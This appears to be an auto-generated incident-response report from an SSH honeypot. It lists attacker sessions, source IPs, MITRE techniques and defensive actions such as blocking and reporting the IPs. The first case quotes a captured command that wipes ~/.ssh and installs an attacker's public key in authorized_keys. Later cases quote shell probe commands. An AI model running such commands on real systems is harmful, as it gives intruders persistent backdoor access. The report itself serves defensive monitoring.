| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 04:13:44` | `cowrie.session.connect` |
| `2026-11-19 04:13:44` | `cowrie.client.version` |
| `2026-11-19 04:13:44` | `cowrie.client.kex` |
| `2026-11-19 04:13:45` | `cowrie.login.success` |
| `2026-11-19 04:13:46` | `cowrie.session.params` |
| `2026-11-19 04:13:46` | `cowrie.command.input` |
| `2026-11-19 04:13:46` | `cowrie.command.failed` |
| `2026-11-19 04:13:47` | `cowrie.log.closed` |
| `2026-11-19 04:13:47` | `cowrie.session.params` |
| `2026-11-19 04:13:47` | `cowrie.command.input` |
| `2026-11-19 04:13:48` | `cowrie.session.file_download` |
| `2026-11-19 04:13:48` | `cowrie.log.closed` |
| `2026-11-19 04:13:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.208[.]13` to AbuseIPDB if not already reported
- [ ] Block `103.189.208[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28b0b9e23645

| Field | Detail |
|---|---|
| **Source IP** | `103.189.208[.]13` |
| **First Seen** | 2026-11-19 04:13 |
| **Last Seen** | 2026-11-19 04:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 04:13:48` | `cowrie.session.connect` |
| `2026-11-19 04:13:48` | `cowrie.client.version` |
| `2026-11-19 04:13:48` | `cowrie.client.kex` |
| `2026-11-19 04:13:49` | `cowrie.login.success` |
| `2026-11-19 04:13:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.208[.]13` to AbuseIPDB if not already reported
- [ ] Block `103.189.208[.]13` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-361a2a9ab121

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-11-19 04:25 |
| **Last Seen** | 2026-11-19 04:25 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_43200e4abbb9ec36dff034eeeeb279e3_small_control'"'"' '"'"'check_43200e4abbb9ec36dff034eeeeb279e3'"'"'', printf '\n%s|%s\n' 'check_43200e4abbb9ec36dff034eeeeb279e3_small_control' 'check_43200e4abbb9ec36dff034eeeeb279e3', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_43200e4abbb9ec36dff034eeeeb279e3_small_math'"'"' "$((236*686+16))"', (236*686+16, printf '\n%s|%s\n' 'check_43200e4abbb9ec36dff034eeeeb279e3_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 04:25:08` | `cowrie.session.connect` |
| `2026-11-19 04:25:09` | `cowrie.client.version` |
| `2026-11-19 04:25:09` | `cowrie.client.kex` |
| `2026-11-19 04:25:12` | `cowrie.login.success` |
| `2026-11-19 04:25:15` | `cowrie.client.size` |
| `2026-11-19 04:25:15` | `cowrie.session.params` |
| `2026-11-19 04:25:16` | `cowrie.command.input` |
| `2026-11-19 04:25:16` | `cowrie.command.input` |
| `2026-11-19 04:25:16` | `cowrie.command.input` |
| `2026-11-19 04:25:16` | `cowrie.command.input` |
| `2026-11-19 04:25:16` | `cowrie.command.input` |
| `2026-11-19 04:25:16` | `cowrie.command.input` |
| `2026-11-19 04:25:16` | `cowrie.command.input` |
| `2026-11-19 04:25:16` | `cowrie.command.input` |
| `2026-11-19 04:25:16` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9424924f4f8e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-11-19 04:27 |
| **Last Seen** | 2026-11-19 04:27 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_3548352a8683984b03fa9375a48d9987_small_control'"'"' '"'"'check_3548352a8683984b03fa9375a48d9987'"'"'', printf '\n%s|%s\n' 'check_3548352a8683984b03fa9375a48d9987_small_control' 'check_3548352a8683984b03fa9375a48d9987', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_3548352a8683984b03fa9375a48d9987_small_math'"'"' "$((680*728+61))"', (680*728+61, printf '\n%s|%s\n' 'check_3548352a8683984b03fa9375a48d9987_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 04:27:26` | `cowrie.session.connect` |
| `2026-11-19 04:27:26` | `cowrie.client.version` |
| `2026-11-19 04:27:26` | `cowrie.client.kex` |
| `2026-11-19 04:27:29` | `cowrie.login.success` |
| `2026-11-19 04:27:32` | `cowrie.client.size` |
| `2026-11-19 04:27:33` | `cowrie.session.params` |
| `2026-11-19 04:27:34` | `cowrie.command.input` |
| `2026-11-19 04:27:34` | `cowrie.command.input` |
| `2026-11-19 04:27:34` | `cowrie.command.input` |
| `2026-11-19 04:27:34` | `cowrie.command.input` |
| `2026-11-19 04:27:34` | `cowrie.command.input` |
| `2026-11-19 04:27:34` | `cowrie.command.input` |
| `2026-11-19 04:27:34` | `cowrie.command.input` |
| `2026-11-19 04:27:34` | `cowrie.command.input` |
| `2026-11-19 04:27:34` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f17e13cbb44

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-11-19 04:29 |
| **Last Seen** | 2026-11-19 04:29 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4156e0346f5ef9348f0810aa59b5e114_small_control'"'"' '"'"'check_4156e0346f5ef9348f0810aa59b5e114'"'"'', printf '\n%s|%s\n' 'check_4156e0346f5ef9348f0810aa59b5e114_small_control' 'check_4156e0346f5ef9348f0810aa59b5e114', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4156e0346f5ef9348f0810aa59b5e114_small_math'"'"' "$((775*910+43))"', (775*910+43, printf '\n%s|%s\n' 'check_4156e0346f5ef9348f0810aa59b5e114_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 04:29:46` | `cowrie.session.connect` |
| `2026-11-19 04:29:46` | `cowrie.client.version` |
| `2026-11-19 04:29:46` | `cowrie.client.kex` |
| `2026-11-19 04:29:50` | `cowrie.login.success` |
| `2026-11-19 04:29:52` | `cowrie.client.size` |
| `2026-11-19 04:29:53` | `cowrie.session.params` |
| `2026-11-19 04:29:54` | `cowrie.command.input` |
| `2026-11-19 04:29:54` | `cowrie.command.input` |
| `2026-11-19 04:29:54` | `cowrie.command.input` |
| `2026-11-19 04:29:54` | `cowrie.command.input` |
| `2026-11-19 04:29:54` | `cowrie.command.input` |
| `2026-11-19 04:29:54` | `cowrie.command.input` |
| `2026-11-19 04:29:54` | `cowrie.command.input` |
| `2026-11-19 04:29:54` | `cowrie.command.input` |
| `2026-11-19 04:29:54` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cafa6c5a3206

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-11-19 04:32 |
| **Last Seen** | 2026-11-19 04:32 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_de70f63095b831d43614d76889a14270_small_control'"'"' '"'"'check_de70f63095b831d43614d76889a14270'"'"'', printf '\n%s|%s\n' 'check_de70f63095b831d43614d76889a14270_small_control' 'check_de70f63095b831d43614d76889a14270', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_de70f63095b831d43614d76889a14270_small_math'"'"' "$((116*592+6))"', (116*592+6, printf '\n%s|%s\n' 'check_de70f63095b831d43614d76889a14270_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 04:32:05` | `cowrie.session.connect` |
| `2026-11-19 04:32:05` | `cowrie.client.version` |
| `2026-11-19 04:32:05` | `cowrie.client.kex` |
| `2026-11-19 04:32:09` | `cowrie.login.success` |
| `2026-11-19 04:32:12` | `cowrie.client.size` |
| `2026-11-19 04:32:13` | `cowrie.session.params` |
| `2026-11-19 04:32:14` | `cowrie.command.input` |
| `2026-11-19 04:32:14` | `cowrie.command.input` |
| `2026-11-19 04:32:14` | `cowrie.command.input` |
| `2026-11-19 04:32:14` | `cowrie.command.input` |
| `2026-11-19 04:32:14` | `cowrie.command.input` |
| `2026-11-19 04:32:14` | `cowrie.command.input` |
| `2026-11-19 04:32:14` | `cowrie.command.input` |
| `2026-11-19 04:32:14` | `cowrie.command.input` |
| `2026-11-19 04:32:14` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2471e7fd1f61

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-11-19 04:34 |
| **Last Seen** | 2026-11-19 04:34 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_a1f733638fb9ff15d9bd39726e95f6f4_small_control'"'"' '"'"'check_a1f733638fb9ff15d9bd39726e95f6f4'"'"'', printf '\n%s|%s\n' 'check_a1f733638fb9ff15d9bd39726e95f6f4_small_control' 'check_a1f733638fb9ff15d9bd39726e95f6f4', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_a1f733638fb9ff15d9bd39726e95f6f4_small_math'"'"' "$((587*273+45))"', (587*273+45, printf '\n%s|%s\n' 'check_a1f733638fb9ff15d9bd39726e95f6f4_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 04:34:18` | `cowrie.session.connect` |
| `2026-11-19 04:34:19` | `cowrie.client.version` |
| `2026-11-19 04:34:19` | `cowrie.client.kex` |
| `2026-11-19 04:34:23` | `cowrie.login.success` |
| `2026-11-19 04:34:25` | `cowrie.client.size` |
| `2026-11-19 04:34:26` | `cowrie.session.params` |
| `2026-11-19 04:34:27` | `cowrie.command.input` |
| `2026-11-19 04:34:27` | `cowrie.command.input` |
| `2026-11-19 04:34:27` | `cowrie.command.input` |
| `2026-11-19 04:34:27` | `cowrie.command.input` |
| `2026-11-19 04:34:27` | `cowrie.command.input` |
| `2026-11-19 04:34:27` | `cowrie.command.input` |
| `2026-11-19 04:34:27` | `cowrie.command.input` |
| `2026-11-19 04:34:27` | `cowrie.command.input` |
| `2026-11-19 04:34:27` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ecd0aa199e3

| Field | Detail |
|---|---|
| **Source IP** | `35.214.148[.]230` |
| **First Seen** | 2026-11-19 04:35 |
| **Last Seen** | 2026-11-19 04:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 04:35:03` | `cowrie.session.connect` |
| `2026-11-19 04:35:03` | `cowrie.login.success` |
| `2026-11-19 04:35:04` | `cowrie.session.params` |
| `2026-11-19 04:35:04` | `cowrie.command.input` |
| `2026-11-19 04:35:04` | `cowrie.command.input` |
| `2026-11-19 04:35:04` | `cowrie.command.failed` |
| `2026-11-19 04:35:04` | `cowrie.command.input` |
| `2026-11-19 04:35:04` | `cowrie.command.failed` |
| `2026-11-19 04:35:04` | `cowrie.command.input` |
| `2026-11-19 04:35:04` | `cowrie.log.closed` |
| `2026-11-19 04:35:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.214.148[.]230` to AbuseIPDB if not already reported
- [ ] Block `35.214.148[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13c4d33d31ec

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-11-19 04:36 |
| **Last Seen** | 2026-11-19 04:36 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_66fe0b39b036636691cfe961fefeaecc_small_control'"'"' '"'"'check_66fe0b39b036636691cfe961fefeaecc'"'"'', printf '\n%s|%s\n' 'check_66fe0b39b036636691cfe961fefeaecc_small_control' 'check_66fe0b39b036636691cfe961fefeaecc', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_66fe0b39b036636691cfe961fefeaecc_small_math'"'"' "$((445*892+80))"', (445*892+80, printf '\n%s|%s\n' 'check_66fe0b39b036636691cfe961fefeaecc_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-19 04:36:33` | `cowrie.session.connect` |
| `2026-11-19 04:36:34` | `cowrie.client.version` |
| `2026-11-19 04:36:34` | `cowrie.client.kex` |
| `2026-11-19 04:36:37` | `cowrie.login.success` |
| `2026-11-19 04:36:39` | `cowrie.client.size` |
| `2026-11-19 04:36:40` | `cowrie.session.params` |
| `2026-11-19 04:36:41` | `cowrie.command.input` |
| `2026-11-19 04:36:41` | `cowrie.command.input` |
| `2026-11-19 04:36:41` | `cowrie.command.input` |
| `2026-11-19 04:36:41` | `cowrie.command.input` |
| `2026-11-19 04:36:41` | `cowrie.command.input` |
| `2026-11-19 04:36:41` | `cowrie.command.input` |
| `2026-11-19 04:36:41` | `cowrie.command.input` |
| `2026-11-19 04:36:41` | `cowrie.command.input` |
| `2026-11-19 04:36:41` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (266) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-fa7306670ccd | HIGH | `80.94.92[.]179` | 2026-11-19 04:38 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d23e179b104b | HIGH | `80.94.92[.]179` | 2026-11-19 04:40 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-05411af1cec7 | HIGH | `45.148.10[.]61` | 2026-11-19 04:41 | Y | 1 | 0 | `T1078 · T1592` |
| IR-6689a87d721b | HIGH | `80.94.92[.]179` | 2026-11-19 04:43 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e9f932026ac0 | HIGH | `193.187.110[.]160` | 2026-11-19 04:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-daad9263640a | HIGH | `35.214.204[.]44` | 2026-11-19 04:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e2d31ad4291c | HIGH | `185.227.144[.]174` | 2026-11-19 04:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5a40f826e138 | HIGH | `176.53.159[.]196` | 2026-11-19 04:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-22660d81f379 | HIGH | `185.227.144[.]174` | 2026-11-19 04:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-37df954faa10 | HIGH | `80.94.92[.]179` | 2026-11-19 04:45 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-fa15fb7e0e8d | HIGH | `34.1.227[.]164` | 2026-11-19 04:45 | Y | 3 | 0 | `T1078` |
| IR-d12777e1740e | HIGH | `80.94.92[.]179` | 2026-11-19 04:47 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-a95815362226 | HIGH | `36.156.22[.]2` | 2026-11-19 04:48 | Y | 0 | 0 | `T1078` |
| IR-2f4d57734002 | HIGH | `65.49.1[.]152` | 2026-11-19 04:49 | Y | 3 | 0 | `T1078` |
| IR-ad14869f4c60 | HIGH | `80.94.92[.]179` | 2026-11-19 04:49 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d6ba42310db6 | HIGH | `93.152.221[.]51` | 2026-11-19 04:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-408090d7fe69 | HIGH | `195.178.110[.]78` | 2026-11-19 04:51 | Y | 0 | 0 | `T1078` |
| IR-2e23c9d4dcc9 | HIGH | `138.226.239[.]233` | 2026-11-19 04:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4c98e04a558c | HIGH | `80.94.95[.]118` | 2026-11-19 04:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b188ffc35b32 | HIGH | `77.90.185[.]29` | 2026-11-19 04:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f903af049934 | HIGH | `45.156.87[.]189` | 2026-11-19 04:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6a92a676c73c | HIGH | `117.247.193[.]27` | 2026-11-19 04:56 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-22570c3f8d0c | HIGH | `117.247.193[.]27` | 2026-11-19 04:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-71df6b5c9c24 | HIGH | `103.241.43[.]193` | 2026-11-19 04:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d5cff4311330 | HIGH | `103.241.43[.]193` | 2026-11-19 04:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0b95c52e914c | HIGH | `125.161.90[.]178` | 2026-11-19 05:00 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f3ce31c08c35 | HIGH | `125.161.90[.]178` | 2026-11-19 05:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1bf9f177b10a | HIGH | `35.214.145[.]207` | 2026-11-19 05:10 | Y | 3 | 0 | `T1078` |
| IR-6d8efc36534c | HIGH | `68.183.161[.]107` | 2026-11-19 05:11 | Y | 0 | 0 | `T1078` |
| IR-e262132afe3d | HIGH | `68.183.161[.]107` | 2026-11-19 05:11 | Y | 8 | 0 | `T1078` |
| IR-cd2f1c54f08c | HIGH | `68.183.161[.]107` | 2026-11-19 05:11 | Y | 40 | 0 | `T1078` |
| IR-92b182cea00f | HIGH | `130.12.181[.]21` | 2026-11-19 05:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6a90768f84e1 | HIGH | `35.214.230[.]217` | 2026-11-19 05:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3ca387d3721e | HIGH | `36.255.97[.]232` | 2026-11-19 05:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-510f12433aa2 | HIGH | `93.152.221[.]108` | 2026-11-19 05:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0fdc79f96e7c | HIGH | `4.221.162[.]168` | 2026-11-19 05:52 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c7f661cee29b | HIGH | `4.221.162[.]168` | 2026-11-19 05:52 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4d5cfa759ce1 | HIGH | `210.123.88[.]216` | 2026-11-19 05:55 | Y | 9 | 0 | `T1057 · T1078 · T1083` |
| IR-a6f0b55f99a7 | HIGH | `160.191.244[.]41` | 2026-11-19 05:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-edb73e318a98 | HIGH | `160.191.244[.]41` | 2026-11-19 05:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f2e7e6cd461b | HIGH | `109.160.32[.]111` | 2026-11-19 06:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-502470eb84b6 | HIGH | `93.152.221[.]51` | 2026-11-19 06:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4ad56e0c5f4a | HIGH | `176.53.159[.]196` | 2026-11-19 06:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2091a97bd84f | HIGH | `195.178.110[.]78` | 2026-11-19 06:18 | Y | 0 | 0 | `T1078` |
| IR-c9606b3a3e70 | HIGH | `77.239.124[.]252` | 2026-11-19 06:25 | Y | 0 | 0 | `T1078` |
| IR-c6d3afb0fc83 | HIGH | `119.96.157[.]188` | 2026-11-19 06:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f4495e032097 | HIGH | `119.96.157[.]188` | 2026-11-19 06:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9159a0aac1bf | HIGH | `130.12.181[.]21` | 2026-11-19 06:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7d7279210fa3 | HIGH | `35.244.32[.]167` | 2026-11-19 06:31 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b9c85f4aac45 | HIGH | `35.244.32[.]167` | 2026-11-19 06:31 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a50bf7f9458c | HIGH | `45.135.194[.]92` | 2026-11-19 06:33 | Y | 0 | 0 | `T1078` |
| IR-d26f800ed9d2 | HIGH | `93.152.221[.]108` | 2026-11-19 06:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b42bfff7b044 | HIGH | `193.32.162[.]15` | 2026-11-19 06:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-158f66eb2191 | HIGH | `80.94.95[.]118` | 2026-11-19 06:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f1389de44254 | HIGH | `77.90.185[.]29` | 2026-11-19 06:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-eae26a9a23b8 | HIGH | `169.128.70[.]53` | 2026-11-19 07:09 | Y | 4 | 0 | `T1078 · T1083` |
| IR-b2801ea0d555 | HIGH | `78.128.112[.]74` | 2026-11-19 07:13 | Y | 1 | 0 | `T1078 · T1592` |
| IR-4540a140d2f6 | HIGH | `45.78.201[.]248` | 2026-11-19 07:37 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-193693e4377d | HIGH | `45.78.201[.]248` | 2026-11-19 07:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-20c7afd7853a | HIGH | `160.119.66[.]206` | 2026-11-19 07:41 | Y | 6 | 3 | `T1059.004 · T1078 · T1105` |
| IR-03810f2ec937 | HIGH | `160.119.66[.]206` | 2026-11-19 07:41 | Y | 1 | 3 | `T1059.004 · T1078 · T1105` |
| IR-7e2348d3aea5 | HIGH | `51.38.224[.]114` | 2026-11-19 07:41 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2668d8d0f00e | HIGH | `51.38.224[.]114` | 2026-11-19 07:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-89ad2d868d34 | HIGH | `92.118.39[.]77` | 2026-11-19 07:45 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-4b79b4a1b8cc | HIGH | `92.118.39[.]77` | 2026-11-19 07:47 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-678812576361 | HIGH | `92.118.39[.]77` | 2026-11-19 07:49 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c43a5a206d5e | HIGH | `58.242.64[.]246` | 2026-11-19 07:50 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5f279ab316f3 | HIGH | `58.242.64[.]246` | 2026-11-19 07:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-be448debf2a1 | HIGH | `92.118.39[.]77` | 2026-11-19 07:51 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-261b15476dd4 | HIGH | `92.118.39[.]77` | 2026-11-19 07:54 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c407a292a308 | HIGH | `92.118.39[.]77` | 2026-11-19 07:56 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-f015b58c8b13 | HIGH | `92.118.39[.]77` | 2026-11-19 08:00 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-a99c48889c67 | HIGH | `92.118.39[.]77` | 2026-11-19 08:02 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-82810c95f76d | HIGH | `92.118.39[.]77` | 2026-11-19 08:04 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-15dbf795a98e | HIGH | `92.118.39[.]77` | 2026-11-19 08:06 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-0ada1ffce791 | HIGH | `92.118.39[.]77` | 2026-11-19 08:08 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-8bcd76555720 | HIGH | `92.118.39[.]77` | 2026-11-19 08:10 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-a652aee3b32e | HIGH | `92.118.39[.]77` | 2026-11-19 08:12 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b73fe634f949 | HIGH | `92.118.39[.]77` | 2026-11-19 08:15 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c7ddb5f88d7a | HIGH | `92.118.39[.]77` | 2026-11-19 08:17 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5099e4aa852b | HIGH | `92.118.39[.]77` | 2026-11-19 08:19 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-7729f40cd2e3 | HIGH | `92.118.39[.]77` | 2026-11-19 08:21 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-3bb72c1c737c | HIGH | `92.118.39[.]77` | 2026-11-19 08:23 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e6af605e2cd5 | HIGH | `92.118.39[.]77` | 2026-11-19 08:25 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-6d41bd584886 | HIGH | `92.118.39[.]77` | 2026-11-19 08:27 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-3184ea5ed61a | HIGH | `92.118.39[.]77` | 2026-11-19 08:29 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b0c4c424c8d9 | HIGH | `92.118.39[.]77` | 2026-11-19 08:31 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
